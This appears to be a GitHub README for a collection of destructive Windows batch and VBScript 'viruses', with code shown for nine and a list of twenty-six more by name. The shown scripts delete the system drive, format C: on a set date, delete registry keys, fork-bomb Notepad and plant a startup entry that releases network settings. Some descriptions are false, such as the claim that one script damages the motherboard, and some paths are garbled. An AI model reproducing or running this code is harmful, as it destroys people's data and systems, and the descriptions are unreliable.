<h1 align="center"> Batch Viruses</h1>

## An awesome collection of different kinds of Computer Viruses written in Batch File.

---
<img src="https://user-images.githubusercontent.com/73777108/149873561-ace30728-a82f-466b-8e43-0433c2c2e87d.png" align="right">

Create amazing yet Deadly viruses with small yet deadly codes. These can be created with just Notepad, and even be downloaded from here.
The viruses here are mostly very dangerous.



---
## ⚠️ALERT: 

- These are only for educational purposes. 
- Never try them on your own device until you are sure of what you are doing.
- Me, or any other contributor to this repo will not be responsible for any damage to your device.
- Handle files with care and awareness.
- Most damages can't be restored or recovered.

---

# The Awesome List of Computer Viruses!


### 1. Deletes all content of a drive


<details><summary> Read More </summary>
 
  
  
<p><a href="https://github.com/SparkScratch-P/batch-virus/blob/main/viruses/virus1.bat">virus1.bat</a></p>
<pre><code> @<span class="hljs-built_in">echo</span> off
<span class="hljs-built_in">del</span> <span class="hljs-variable">%systemdrive%</span>\*.* /f /s /q
shutdown -r -f -t <span class="hljs-number">00</span>
</code></pre>
 

  </details>



### 2. Time Bomb Virus, formats C: on 25 November 2023


<details><summary> Read More </summary>
  
  
  
<p><a href="https://github.com/SparkScratch-P/batch-virus/blob/main/viruses/virus2.bat">virus2.bat</a></p>
<pre><code><span class="hljs-keyword">If</span> <span class="hljs-variable">%date%</span> <span class="hljs-keyword">NEQ</span> <span class="hljs-number">2023</span>/<span class="hljs-number">11</span>/<span class="hljs-number">25</span> <span class="hljs-keyword">goto</span> <span class="hljs-keyword">exit</span>
<span class="hljs-built_in">format</span> C: /y &gt;<span class="hljs-built_in">nul</span>
:<span class="hljs-keyword">exit</span>
<span class="hljs-keyword">exit</span>
</code></pre><p>The Date, Time, and the Drive to be formatted can be changed.</p>
  
   

  </details>



### 3. Crash Ur Computer of Windows Xp


<details><summary> Read More </summary>

<p><a href="https://github.com/SparkScratch-P/batch-virus/blob/main/viruses/virus3.bat">virus3.bat</a></p>
<pre><code><span class="hljs-keyword">Option</span> <span class="hljs-keyword">Explicit</span>

<span class="hljs-keyword">Dim</span> WSHShell
<span class="hljs-keyword">Set</span> WSHShell=Wscript.<span class="hljs-built_in">CreateObject</span>(“Wscript.Shell”)

<span class="hljs-keyword">Dim</span> x
<span class="hljs-keyword">For</span> x = <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> <span class="hljs-number">100000000</span>
WSHShell.Run “Tourstart.exe”
<span class="hljs-keyword">Next</span>
</code></pre><p>This Virus works only for Windows XP, and besides formatting the drives, it damages the motherboard.</p>

   

  </details>

### 4.  Delete Key Registry Files 



<details><summary> Read More </summary>
 
 <p><a href="https://github.com/SparkScratch-P/batch-virus/blob/main/viruses/virus4.bat">virus4.bat</a></p>
<pre><code>@ECHO OFF
START <span class="hljs-keyword">reg</span> <span class="hljs-keyword">delete</span> HKCR/.<span class="hljs-keyword">exe</span>
START <span class="hljs-keyword">reg</span> <span class="hljs-keyword">delete</span> HKCR/.dll
START <span class="hljs-keyword">reg</span> <span class="hljs-keyword">delete</span> HKCR/*
:MESSAGE
ECHO Your computer <span class="hljs-built_in">has</span> been fcked. Have <span class="hljs-keyword">a</span> nice day.
GOTO MESSAGE
</code></pre><p>This virus is extremely dangerous, don&#39;t run it on your device.</p>

  </details>

### 5. The Most Simple Virus To Crush The Window. Delete C:/


<details><summary> Read More </summary>
 
 
<p><a href="https://github.com/SparkScratch-P/batch-virus/blob/main/viruses/virus5.bat">virus5.bat</a></p>
<pre><code>@Echo <span class="hljs-literal">off</span>
Del C:<span class="hljs-string">\</span> *.* |y
</code></pre><p>Your device will not restart again, after it runs once!</p>

 
  </details>
 
 
 ### 6. Endless Notepads


<details><summary> Read More </summary>
 
 
<p><a href="https://github.com/SparkScratch-P/batch-virus/blob/main/viruses/virus6.bat">virus6.bat</a></p>
<pre><code>@<span class="hljs-built_in">ECHO</span> off
:top
<span class="hljs-built_in">START</span> <span class="hljs-variable">%SystemRoot%</span>\system32\notepad.exe
<span class="hljs-keyword">GOTO</span> top
</code></pre><p>This will open endless notepads, until ur system gets overloaded, hanged, and crashed!</p>
<p>NOTE : If you mistakenly open it, immediately power of and force shut down your computer, else it may crash, never to start again.</p>

 
  </details>
 

### 7. Disable Internet Permanently


<details><summary> Read More </summary>
 
 <p><a href="https://github.com/SparkScratch-P/batch-virus/blob/main/viruses/virus7.bat">virus7.bat</a></p>
<pre><code><span class="hljs-symbol">echo</span> <span class="hljs-comment">@echo off&gt;c:windowswimn32.bat</span>
<span class="hljs-symbol">echo</span> <span class="hljs-keyword">break </span>off&gt;&gt;c:windowswimn32.<span class="hljs-keyword">bat
</span><span class="hljs-symbol">echo</span> ipconfig/release_all&gt;&gt;c:windowswimn32.<span class="hljs-keyword">bat
</span><span class="hljs-symbol">echo</span> <span class="hljs-meta">end</span>&gt;&gt;c:windowswimn32.<span class="hljs-keyword">bat
</span><span class="hljs-symbol">reg</span> <span class="hljs-keyword">add </span>hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.<span class="hljs-keyword">bat </span>/f
<span class="hljs-symbol">reg</span> <span class="hljs-keyword">add </span>hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.<span class="hljs-keyword">bat </span>/f
<span class="hljs-symbol">echo</span> You Have <span class="hljs-keyword">Been </span>HACKED!
<span class="hljs-symbol">PAUSE</span>
</code></pre><p>Your device will never ever connect to the internet if this virus runs once!</p>
  
  </details>
 


### 8. Crazy Caps Lock


<details><summary> Read More </summary>
 
 <p><a href="https://github.com/SparkScratch-P/batch-virus/blob/main/viruses/virus8.bat">virus8.bat</a></p>
<pre><code><span class="hljs-keyword">Set</span> wshShell <span class="hljs-comment">=wscript.CreateObject(</span>”<span class="hljs-comment">WScript.Shell</span>”<span class="hljs-comment">)</span>
do
wscript.sleep <span class="hljs-comment">100</span>
wshshell.sendkeys “<span class="hljs-comment">{CAPSLOCK}</span>”
loop
</code></pre><p>This repeatedly toggles your Caps Lock key. It is fully harmless and gets proper on reboot, or once the task is ended in Task Manager.</p>

   
  </details>


### 9. Endless Backspace



<details><summary> Read More </summary>
 
<p><a href="https://github.com/SparkScratch-P/batch-virus/blob/main/viruses/virus9.bat">virus9.bat</a></p>
<pre><code>MsgBox “Let’s go back <span class="hljs-selector-tag">a</span> few steps”
Set wshShell =wscript.CreateObject(”WScript.Shell”)
do
wscript<span class="hljs-selector-class">.sleep</span> <span class="hljs-number">100</span>
wshshell<span class="hljs-selector-class">.sendkeys</span> “{bs}”
loop
</code></pre><p>This will repeatedly keep pressing your Backspace, and will not let u type. It pops up a message; “Let’s go back a few steps”, and starts nuisence. Anyways, it is temporary, and harmless.</p>
    
  </details>



virus10.bat
Disable the Antivirus
virus11.bat
Task-kill some apps
virus12.bat
Command Line Notepad
yesterday
virus13.bat
CD/ROM popper with malicious popups
yesterday
virus14.bat
CD drive popup
yesterday
virus15.bat
stop current internet access
virus16.bat
Format all Drives from C to J
virus17.bat
Delete Entire Registry
virus18.bat
Crash PC for ever
virus19.bat
Application bomber
virus20.bat
Delete System 32 Folder
virus21.bat
Disgust and shut down!
virus22.bat
Destroy-shutdown with popup
virus23.bat
Shutdowns Computer Everytime It Is Turned On
virus24.bat
Change useful random files to on-working txt files
virus25.bat
system meltdown
virus26.bat
flood internet
virus27.bat
Matrix virus
virus28.bat
Bloat randon folder
virus29.bat
User Account Bloatware
virus30.bat
overload with unlimited background processes

virus31.bat
Rabs killer and system crasher virus
virus32.bat
Show incognito history
virus33.bat
Delete entire system
virus34.bat
Create virus34.bat
virus35.bat
txt bloater
